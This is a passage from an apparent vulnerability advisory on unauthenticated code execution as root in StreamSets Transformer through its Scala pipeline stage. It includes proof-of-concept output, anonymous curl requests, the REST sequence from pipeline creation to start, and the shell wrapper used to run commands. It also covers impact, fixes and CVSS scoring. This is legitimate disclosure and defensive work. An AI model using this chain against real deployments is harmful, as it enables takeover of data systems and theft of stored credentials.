[*] status poll 0: STARTING
[*] status poll 1: STARTING
[*] status poll 2: RUNNING
[*] status poll 3: RUNNING
[*] status poll 4: RUNNING
[*] status poll 5: FINISHED
[*] Final status: FINISHED
[+] Scala code executed; command output written to /tmp/tf_rce_marker_<token-3> inside the container
[*] Read the marker out of band:
    docker exec <container> cat /tmp/tf_rce_marker_<token-3>
[*] pipelineId: tfpocc14f47d01df6-d443-486f-89bf-af400e3b2b10
============================================================
[+] Complete - pipeline FINISHED, command executed as root
```

The corresponding HTTP status codes for each step of the chain:

| Step | Request | Status | Recorded observation |
|---|---|---|---|
| create | `PUT /rest/v1/pipeline/{title}?autoGeneratePipelineId=true` | 201 | anonymous creation accepted, `pipelineId` returned |
| fetch | `GET /rest/v1/pipeline/{id}` | 200 | empty pipeline JSON, `stages=0` |
| save | `POST /rest/v1/pipeline/{id}?rev=0` | 200 | `ScalaDTransform` stage with the Scala payload accepted |
| start | `POST /rest/v1/pipeline/{id}/start` | 200 | anonymous start accepted |
| status | `GET /rest/v1/pipeline/{id}/status` | 200 | `STARTING` → `RUNNING` → `FINISHED` at poll 5 |

### Dynamic verification: independent proof of the authentication boundary

The absence of any authentication gate was confirmed separately from the exploit chain, with plain `curl` and no headers other than the CSRF constant and a content type:

```
$ curl -s -o /dev/null -w "HTTP %{http_code} size=%{size_download}\n" http://127.0.0.1:19630/rest/v1/pipelines
HTTP 200 size=3440

$ curl -s -o /dev/null -w "HTTP %{http_code}\n" -X PUT \
    "http://127.0.0.1:19630/rest/v1/pipeline/anon_test?autoGeneratePipelineId=true" \
    -H "X-Requested-By: SDC" -H "Content-Type: application/json"
HTTP 201
```

An anonymous `GET` listing every pipeline returns `200` with a 3440-byte body; an anonymous `PUT` creates one and returns `201`. Neither request carried an `Authorization` header, a session cookie or a DPM token. The `X-Requested-By: SDC` header required by `CsrfProtectionFilter` is a fixed constant and is not authentication material.

### Dynamic verification: target-side evidence and marker freshness

The command output written by the compiled Scala into the container filesystem:

```
$ docker exec transformer cat /tmp/tf_rce_marker_<token-3>
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
POCOK
```

Marker metadata, and the container's own process identity as a control:

```
$ docker exec transformer stat /tmp/tf_rce_marker_<token-3>
  File: /tmp/tf_rce_marker_<token-3>    Size: 136
  Modify: <timestamp matching the run minute; calendar value redacted for publication>

$ docker exec transformer id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

The `uid=0(root)` in the marker is not a restatement of the container's identity; it is the output of the `id` binary executed as a child of the JVM by the injected Scala, so it is proof of execution rather than of configuration. The independent `docker exec transformer id` control shows the container process is itself uid 0, which is why the child inherits root. Three properties were checked to rule out stale or planted evidence: the marker name carries the per-run unique token, its modification time coincides with the run, and its owner is `root:root` with the exact byte size the recorded command produces. On the quoted block above, one accuracy point: the record preserves that `stat` line with `File`, `Size` and `Modify` fields only, and it contains **no owner field**. Two alterations were made to it here and both are declared: the `Modify` calendar value is redacted, and the one line the record preserves has been wrapped onto two for readability. No field has been added to it and none has been removed from it. The `root:root` ownership is nonetheless a recorded fact — the research record states it for the marker files separately from this output, in the run summary and in the identity confirmation — which is why it is stated here in prose rather than inside the quotation.

All three runs are summarised below. Each used a distinct token, a distinct marker file and no credentials. The per-run token values are elided here and in the transcripts that follow: this project's publication rules do not reproduce a recorded per-run token, and the PoC generates a fresh one on each execution.

| Run | Token | Command executed | Marker size | Marker content | Terminal status |
|---|---|---|---|---|---|
| 1 | `<token-1>` | `id` | 136 bytes | `uid=0(root) gid=0(root) groups=0(root),1(bin),...` + `POCOK` | FINISHED |
| 2 | `<token-2>` | `whoami; hostname` | 23 bytes | `ARBITRARY_CMD_OK` + `POCOK` | FINISHED |
| 3 | `<token-3>` | `id` | 136 bytes | `uid=0(root) gid=0(root) groups=0(root),1(bin),...` + `POCOK` | FINISHED |

Run 2 is the run whose recorded marker content differs from that of Runs 1 and 3, so it establishes that what was executed is not a fixed string. The claim made about it here is deliberately narrow, because a broader claim made in an earlier draft of this analysis was not supportable and has been withdrawn.

- **What is defensible, and it is sufficient.** The exploit wrapper that assembles the shell command — recorded in the research-phase script and reproduced identically by the shipped PoC's payload builder — is `"%s > %s 2>&1; echo POCOK >> %s"`. Whatever command the operator supplies therefore reaches `/bin/sh` inside a string that already contains `>`, `2>&1` and a `;` separator, and that construct demonstrably worked: the marker files exist, they carry a command's redirected stdout and stderr, and each carries an appended `POCOK` line that only the post-`;` half of the wrapper can have written. Output redirection and command sequencing are shell features, not properties of an argument vector, so their observable effect is what establishes `sh -c` semantics — that the string is handed intact to a shell rather than split on whitespace.
- **What has been withdrawn.** An earlier draft argued from Run 2 that its shell command spanned more than one binary. That argument is withdrawn as unsupportable. The research record labels Run 2's command as `whoami; hostname` but records that run's marker as `ARBITRARY_CMD_OK` followed by `POCOK`, at 23 bytes. Both cannot be true: `whoami; hostname` would have written `root` and a host name into that file, whereas the recorded byte count is exactly the length of the recorded content — `ARBITRARY_CMD_OK` is 16 bytes, one newline is 1, `POCOK` is 5, one newline is 1, total 23. The recorded content is therefore self-consistent and the recorded command is not. **The research record is internally inconsistent about Run 2, and this advisory discloses that inconsistency rather than silently adopting whichever side supports its argument.** What command Run 2 actually issued is unknown; the table above reproduces the record's label and its recorded content verbatim and side by side precisely so that the contradiction is visible to the reader, and no inference is drawn from it.
- **What survives the withdrawal.** Everything load-bearing does. The `sh -c` conclusion rests on the wrapper's own `>`, `2>&1` and `;` construct, which every one of the three runs used — including Runs 1 and 3, whose command, marker content, marker size, freshness and `root:root` ownership are all recorded and mutually consistent.

### Dynamic verification: adversarial review

Two independent review passes were run over the chain during the research phase. A falsification pass attacked six dimensions and failed to refute the finding, returning `NOT_REFUTED` at confidence `0.82`. A separate re-analysis pass re-derived the chain from the decompiled classes without reference to the original conclusions and returned `CONFIRMED` at confidence `0.82`.

| Angle | Question put to the falsification pass | Outcome |
|---|---|---|
| 1 | Is the sink actually reachable over REST, or does pipeline start skip stage materialisation? | **Reachable.** `start` returned 200 and the status progression reached `FINISHED`; a marker file appeared, which only happens if `ScalaTransform.init()` compiled and `transform()` ran the runner. |
| 2 | Is the `code` parameter genuinely attacker-controlled end to end? | **Yes.** The value saved through `POST /rest/v1/pipeline/{id}?rev=0` is the value executed; Runs 1 and 3 carry a recorded `id` invocation and a recorded `id` output that agree in content and in byte size, and the marker content differs between the `id` runs and Run 2. The separate multi-binary formulation once attached to this row is withdrawn — see the note above on Run 2. |
| 3 | Is some filter or interceptor missed that would block an anonymous caller? | **None found.** `createSecurityHandler()` returns `null` for mode `none`, and `AlwaysAllRolesFilter` grants every role; `CsrfProtectionFilter` only checks a fixed header constant. |
| 4 | Is there hardening in the shipped artifact that defeats the chain? | **Not in the tested state.** The residual doubt recorded — see below — is precisely that the image's shipped property value is `aster`, which does defeat it; the test state was explicitly configured. |
| 5 | Could the marker be historical or planted rather than produced by the run? | **No.** Per-run unique token in the file name, modification time matching the run, owner `root:root`, size matching the command. |
| 6 | Is the "default configuration" reasoning sound? | **Qualified.** `none` is the code-level fallback and a documented value, but it is **not** the shipped property value; the classification was narrowed to configuration-dependent on this basis. |

The residual doubt the review recorded is the one this advisory promotes to the headline qualification: the distributed image sets `http.authentication=aster`, so the anonymous state is reached by operator choice or by loss of the property, not by pulling the image and starting it.

### Dynamic verification: what was NOT exercised

Stating the boundary of the evidence is part of the evidence. The following were **not** tested and no claim is made about them:

- **The shipped `aster` / DPM-enabled state.** No attempt was made to reach the pipeline API on an instance left at its shipped property value, because the record documents that mode as requiring DPM registration. There is no evidence of an authentication bypass against `aster`.
- **The unmodified fallback path.** No run was performed with `transformer.properties` deleted or with the `http.authentication` key removed to observe the code fallback engage on a real instance. The fallback behaviour is established from decompiled code (`conf.get(AUTHENTICATION_KEY, "none")`), not from a live experiment.
- **Network exposure.** The container port was published on loopback only, so no run was performed from a remote network position. Reachability over IP is inferred from the service being a plain HTTP listener; it was not measured.
- **TLS.** No HTTPS deployment was exercised.
- **Other execution modes and Spark topologies.** Only `executionMode=BATCH` was run. `STREAMING`, `STANDALONE`, external Spark clusters, Databricks-style deployments and multi-executor topologies were not exercised, so this advisory makes no claim about where the compiled code would run in those configurations.
- **Other versions.** Only 3.17.0 was tested. No other Transformer release was installed, decompiled or probed.
- **Post-exploitation.** No persistence mechanism, no lateral movement, no credential harvesting from stored pipeline connections and no container escape was attempted. Nothing beyond single-command execution as uid 0 inside the container is claimed.
- **Command output return over HTTP.** The chain was never turned into an HTTP-visible result; every confirmation came from a marker file read through container access.

## 10. Reachability and Security Impact

### Reachability: preconditions and whether each is shipped or operator-controlled

| Precondition | Shipped by default? | Evidence |
|---|---|---|
| HTTP REST listener on port 19630 | yes | Jetty 9.4.22 web tier in `streamsets/transformer:3.17.0` |
| Effective `http.authentication` resolves to `none` | **no** | shipped `transformer.properties:85` sets `aster`; `none` is the code fallback (`WebServerTask.java:133`) and a value documented at `transformer.properties:83` |
| DPM disabled, `dpm.enabled=false` | yes | recorded default of `/etc/transformer/dpm.properties`; required by `provideNoAuthenticationRoles` |
| `AlwaysAllRolesFilter` registered on `/*` | follows from the two rows above | `WebServerModule.java:217-228` conjunction on mode `none` and `!isDPMEnabled()` |
| `ScalaDTransform` present in the stage library | yes | `streamsets-spark-basic-lib`, stage version `3` |
| No sandbox on stage code execution | yes | the three recorded absences in the compile-and-run path — `SecurityManager`, sandbox and API allowlist. Execution in the service's own JVM is separately recorded as an observation, not as an absence |
| Container process runs as uid 0 | yes, for the tested image | `docker exec transformer id` returned `uid=0(root)` |
| Pipeline can be created, saved and started over REST | yes in the `none` state | HTTP 201 / 200 / 200 / 200 recorded across three runs |
| `X-Requested-By` CSRF header | attacker-set constant | value `SDC`, sent by every client |

Remote reachability in the `none` state is unqualified: plain HTTP, no MITM position, no default credential, no physical access, no user interaction. What is qualified is the **state** itself — one row in the table above is operator-controlled, and it is the row that decides whether the chain is anonymous at all.

### Impact: what an attacker gains

- **Execution identity is root.** The Scala runs inside the Transformer JVM, and that JVM is the container's uid 0 process. `scala.sys.process` therefore spawns root children. There is no escalation step, no sudoers dependency and no write-then-restart requirement — the first command an attacker runs is already root.
- **Confidentiality: High.** Root inside the container gives unrestricted read of the pipeline store (every saved pipeline definition, including connection configuration and any credentials held in it), of `/etc/transformer/*.properties`, of the JVM's own environment and of the container filesystem. Where the container mounts volumes or holds Spark credentials for external systems, those are equally readable.
- **Integrity: High.** Arbitrary modification of the product's configuration, of stored pipelines and of container files. Because pipeline definitions persist, an attacker can also leave a dormant stage that re-executes on the next scheduled or manual run — an inference from the observed persistence of saved configuration, not something this research tested.
- **Availability: High.** The service, its pipelines and its Spark runs can be stopped, corrupted or made to consume the host's resources. As a data-pipeline engine, Transformer typically sits between upstream sources and downstream warehouses, so loss of the service interrupts data flows beyond the host.
- **Pivot potential.** The container's supplementary groups recorded by `id` include `disk` and `adm`, and the process is uid 0 inside a container whose isolation properties were **not** assessed in this research. No container escape was attempted and none is claimed; the group list is recorded here only because it is part of the verified output.
- **Detection difficulty.** Every request in the chain is an ordinary, permitted product operation: creating a pipeline, saving a pipeline, starting a pipeline. There is no malformed packet, no overflow and no anomalous parameter encoding — the distinguishing signal is the *content* of a `code` configuration field on a stage type the product ships and documents. The research did not examine what the product logs for pipeline create/save/start events, so no claim is made about log visibility.

### Reachability: relationship to the sibling Data Collector product

StreamSets Data Collector is a different product with a different engine, and it has been the subject of earlier research — including this repository's own published Data Collector advisory at `product/streamsets/datacollector-6.4.1/default-creds-shell-executor-root-rce/`, which documents hard-coded default credentials reaching the `ShellDExecutor` stage and a subsequent sudoers-based escalation from the unprivileged `sdc` user (uid 20159) to root.

The three differences are substantive rather than cosmetic:

| Dimension | Data Collector research | This finding |
|---|---|---|
| Engine and stage family | SDC engine, `ShellDExecutor` shell stage | Spark engine, `ScalaDTransform` Scala stage compiled by `scala.tools.nsc.Global` |
| Trust assumption broken | well-known hard-coded credentials (a credential-management defect) | absence of any authentication handler plus a synthesised `admin` principal and blanket role grant (an authentication and authorisation defect) |
| Path to root | required a separate sudoers weakness to escalate from uid 20159 | none — the verified container process is already uid 0 |

Nothing published about Data Collector covers this chain. A fix that removed default credentials from Data Collector, or that restricted its shell stage, would leave Transformer's `none` mode and `ScalaDTransform` untouched, and vice versa. The two findings share only a product family and a design pattern — shipping an operator-authored code stage as a first-class feature — and it is that shared pattern, rather than any shared code path, that makes the pair worth reading together.

### Reachability: independence from other StreamSets research

Our research record's prior-art survey for this product recorded **zero published vulnerability entries** for StreamSets Transformer, no conference or vendor-neutral disclosure-channel writeups in the sources checked, and no notes on the product from earlier work. No CVE identifier or other public reference number is cited in this advisory, because none exists in the record for this finding, and this advisory does not assert one. If the vendor or a coordinator later assigns an identifier, it will be added here.

This finding is our own analysis: the decompilation of `WebServerTask`, `WebServerModule`, `AlwaysAllRolesFilter`, `ScalaDTransform`, `ScalaTransform` and `TransformScriptRunner`; the reconstruction of the three-stage Spark pipeline required to make the stage execute; and the dynamic verification with per-run unique markers.

## 11. Fix Recommendations

### Fix recommendations: vendor changes addressing the root cause

The root cause is not the existence of a Scala stage. It is that the web tier fails **open** — an unresolvable authentication property silently degrades to no authentication, and the same state additionally manufactures an `admin` principal with every role. Six fixes follow from that.

1. **Make the authentication property fail closed.** Replace the `none` literal used as the second argument of `conf.get(AUTHENTICATION_KEY, "none")` in `WebServerTask` — currently mirrored by `AUTHENTICATION_DEFAULT` at `WebServerTask.java:133` — with a value that cannot serve traffic. An absent or unparseable `http.authentication` should refuse startup with an explicit error naming the missing key, rather than start an open listener. Fail-closed is the single change that removes the worst consequence of a trimmed configuration file.
2. **Require explicit opt-in for `none`, and make it loud.** If `none` must remain selectable for evaluation and debugging, gate it behind an acknowledgement the operator has to type (for example a second property such as `http.authentication.none.acknowledged=true`), emit a start-up banner and a log line at every bind, and surface the state in the UI header and in `GET /rest/v1/*` diagnostics so it is impossible to be quietly anonymous.
3. **Strip mutating operations from `none` mode.** Even where an administrator has chosen `none`, restrict the anonymous surface to read-only health and version endpoints. `PUT /rest/v1/pipeline/{title}`, `POST /rest/v1/pipeline/{id}?rev=0` and `POST /rest/v1/pipeline/{id}/start` are pipeline-authoring operations; in an unauthenticated mode they should return 403 rather than 201/200. This alone breaks the documented chain while preserving the legitimate use of the open mode.
4. **Delete `AlwaysAllRolesFilter`, or invert its polarity.** A filter registered on `/*` whose `isUserInRole` returns `true` for every role name and whose `getUserPrincipal` returns `admin` converts annotation-based authorisation into decoration. When no security handler is installed, `@RolesAllowed` endpoints should default-deny instead of default-allow; where a development convenience is genuinely wanted, restrict the synthesised principal to a named low-privilege role that no pipeline-authoring endpoint accepts.
5. **Sandbox the Scala stage, or remove it from the default library.** `TransformScriptRunner` compiles operator text with `scala.tools.nsc.Global` and executes it in the service JVM with the entire application classpath available. Options in increasing strength: install a `SecurityManager` (or a Java 17+ equivalent such as a restricted `ClassLoader` with a package allowlist) for stage execution; block `scala.sys.process`, `java.lang.Runtime`, `java.lang.ProcessBuilder` and reflection entry points; require pre-compiled and signed stage libraries instead of inline source; or run stage compilation in a separate short-lived process under a distinct uid. The research record documents the absence of a `SecurityManager`, of a sandbox and of an API allowlist, and that documented absence means the product currently delegates all containment to the OS identity of its own process. Whether compilation could also be relocated to a separate low-privilege process was not examined here and is offered as a hardening option rather than as a recorded gap.
6. **Stop running as root.** The container process is uid 0, so every code-execution defect in the product is automatically a container-root defect. The sibling Data Collector image already demonstrates the alternative by running as the unprivileged `sdc` user (uid 20159). Shipping Transformer with a non-root user, a read-only root filesystem, dropped capabilities and no privileged mounts removes the escalation that this chain does not currently need.

### Fix recommendations: operator mitigations available today

7. **Verify the effective authentication mode of every instance** with a single unauthenticated request: `GET /rest/v1/pipelines`. A `200` response means the instance is anonymous right now — this is the outcome that was actually observed. A `401` or `403` would indicate an installed handler; that outcome was **not** observed in this research and is stated as expected platform behaviour rather than as a measurement. This is the cheapest possible control and it takes one second per host.
8. **Pin `http.authentication` in `transformer.properties` and enforce it in configuration management.** Line 85 of the shipped file already carries `http.authentication=aster`; treat that line as required, alert on drift, and mount configuration volumes so that the key can never be silently absent — because absence resolves to `none`.
9. **Never expose port 19630 to an untrusted network.** Place Transformer behind a VPN, a service mesh with mutual TLS or a reverse proxy that performs its own authentication, and prefer publishing on an internal interface. In the verified deployment the port was bound to loopback; that binding is what kept the lab host safe, not anything in the product.
10. **Run the container as a non-root user** with `--user`, a read-only root filesystem, `--cap-drop=ALL` and no host mounts. This does not prevent the code execution but it converts root-inside-container into an unprivileged shell, which materially raises the cost of everything after it.
11. **Restrict who may author and start pipelines even in authenticated modes.** Treat any user with pipeline-write permission as holding code-execution capability on the host, because `ScalaDTransform` is exactly that. Separate authoring roles from read-only roles, and review existing pipelines for Scala stages whose source nobody recognises.
12. **Monitor the pipeline lifecycle API.** Alert on pipeline create, save and start events, on new stages of type `com_streamsets_pipeline_spark_transform_scala_ScalaDTransform`, and on child processes of the JVM that are not part of a normal Spark run. Detection here is hard because every request is individually legitimate; the useful signal is a Scala stage appearing in a pipeline that previously had none.

## 12. CWE and CVSS

### CWE classification

Recorded by the research, and carried into this advisory unchanged:

- **CWE-306 — Missing Authentication for Critical Function.** The pipeline create/save/start endpoints are critical functions, and in the `none` state they are served with `securityHandler = null`. This is the primary classification for the web-tier defect.
- **CWE-94 — Improper Control of Generation of Code (Code Injection).** The `code` configuration field is attacker-supplied text handed to `scala.tools.nsc.Global`, compiled and executed. This is the primary classification for the sink.

Added by this advisory as its own derivation from the recorded evidence, not present in the research record:

- **CWE-1188 — Insecure Default Initialization of Resource.** `WebServerTask.AUTHENTICATION_DEFAULT = "none"` means the value applied when the property cannot be resolved is the least secure of the five documented modes. The product initialises to an open state rather than a closed one.
- **CWE-285 — Improper Authorization.** `AlwaysAllRolesFilter.isUserInRole()` returns `true` for every role and `getUserPrincipal()` returns a synthesised `admin`, so annotation-driven authorisation is satisfied unconditionally. CWE-306 covers the missing authentication; CWE-285 covers the separately broken authorisation gate.
- **CWE-250 — Execution with Unnecessary Privileges.** The container process runs as uid 0. Nothing in the recorded functionality requires root, and the sibling product already ships a non-root service user.

### CWE mapping and CVSS derivation from the recorded metrics

The research record for this finding carries **no CVSS vector and no score**; the values below are this advisory's own derivation, metric by metric, from evidence in the record. Two readings are defensible and both are published. The **primary** reading is 8.1 High, which describes the product as distributed. The **conditional** reading is 9.8 Critical, which describes the population of deployments whose effective mode actually resolves to `none` — including the instance that was verified.

Metric by metric, with the evidence that fixes each value:

- **AV:N (Network).** The entire chain is plain HTTP against port 19630 — four mutating requests plus the status polls used to observe completion, ten requests in total in the recorded run. No local access, no adjacent network position, no physical proximity and no MITM position is required. Recorded directly in the verification transcript.
- **AC:L or AC:H — the one metric the two readings differ on.** In a deployment already in the `none` state, nothing conditions the attack: no race, no memory-corruption reliability question, no target-specific reconnaissance, no second vulnerability and no preparatory access. The chain completed deterministically in three of three runs, which is the definition of `AC:L`. But reaching that state is not something the attacker causes, and it is not what the distributed image sets — the shipped `transformer.properties:85` reads `http.authentication=aster`. A successful attack therefore depends on a condition beyond the attacker's control, namely that the target be configured (or have degraded) into a specific non-default state. That is the CVSS 3.1 definition of `AC:H`. This advisory treats `AC:H` as primary because it describes the product as shipped, and `AC:L` as conditional because it describes the verified state.
- **PR:N (None).** Zero credentials are needed in the `none` state: no `Authorization` header, no cookie, no DPM token. The `X-Requested-By: SDC` header is a fixed public constant demanded by a CSRF filter and is not privilege material. `PR:N` is correct in both readings, and this is the metric that carries the whole severity — the configuration dependency is expressed through `AC`, not by inventing a privilege requirement the attacker does not have.
- **UI:N (None).** No action by a legitimate user is required. Pipeline creation, saving and starting are all performed by the attacker's own requests; no administrator needs to open a link, approve a job or restart a service.
- **S:U (Unchanged).** The vulnerable component is the Transformer web tier and its pipeline execution path; the impacted component is the same product's own JVM and the container filesystem it owns. Code executes inside the same authority that accepted the request — there is no crossing into a different security authority, no hypervisor escape and no other tenant reached. The escalation from "anonymous HTTP client" to "uid 0 inside the container" is a privilege gain within one authority, so the score deliberately does not claim a scope change. Had the chain been demonstrated to break out of the container, `S:C` would be the correct value and the changed-scope formula would apply.
- **C:H.** Root execution yields unrestricted read of every stored pipeline definition, the properties files under `/etc/transformer/`, the JVM environment and the whole container filesystem.
- **I:H.** Root execution plus a persistent pipeline store yields unrestricted modification of product configuration, stored pipelines and container files.
- **A:H.** The service, its Spark runs and the container itself can all be stopped, corrupted or exhausted.

Arithmetic for both readings, using the CVSS 3.1 base formula with `Roundup` meaning ceiling to the nearest tenth.

```
ISS         = 1 - [(1-0.56) x (1-0.56) x (1-0.56)] = 1 - 0.085184 = 0.914816
Impact(S:U) = 6.42 x 0.914816 = 5.873119

Conditional reading, AC:L (weight 0.77):
  Exploitability = 8.22 x 0.85 (AV:N) x 0.77 (AC:L) x 0.85 (PR:N, S:U) x 0.85 (UI:N) = 3.887043
  Base = Roundup(min(5.873119 + 3.887043, 10)) = Roundup(9.760161495) = 9.8

Primary reading, AC:H (weight 0.44):
  Exploitability = 8.22 x 0.85 (AV:N) x 0.44 (AC:H) x 0.85 (PR:N, S:U) x 0.85 (UI:N) = 2.221167
  Base = Roundup(min(5.873119 + 2.221167, 10)) = Roundup(8.094286) = 8.1
```

Both values were recomputed from their vectors under the CVSS 3.1 base metric algorithm, whose changed-scope term is `7.52*(ISS-0.029) - 3.25*(ISS*0.9731-0.02)**13` for completeness of the reference implementation even though `S:U` uses `6.42*ISS` here.

Published scores and vectors:

- **Primary (configuration-dependent, describes the product as distributed): CVSS 3.1 base 8.1, High — `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H`.**
- **Conditional (describes deployments whose effective mode resolves to `none`, including the verified instance): CVSS 3.1 base 9.8, Critical — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`.**

Why the pair is published rather than a single headline. Leading with 9.8 alone would assert that a freshly deployed StreamSets Transformer is anonymously exploitable, and the shipped `transformer.properties` contradicts that. Leading with 8.1 alone would understate every installation that has selected `none`, or that has lost the property and fallen back to the code default — a real population, since `none` is documented as a valid value and is what the code chooses when the key is missing. The 8.1 / 9.8 pair states both facts without either of them being implied by the other. Severity labels follow the CVSS 3.1 qualitative scale: 8.1 sits in the High band (7.0 to 8.9) and 9.8 in the Critical band (9.0 to 10.0).

---

Advisory: https://0day-rubbish.com/blog/streamsets-transformer-auth-none-scaladtransform-code-execution
Repository: https://github.com/Exploit-Garbage/0day-Rubbish
Contact: disclosure@0day-rubbish.com
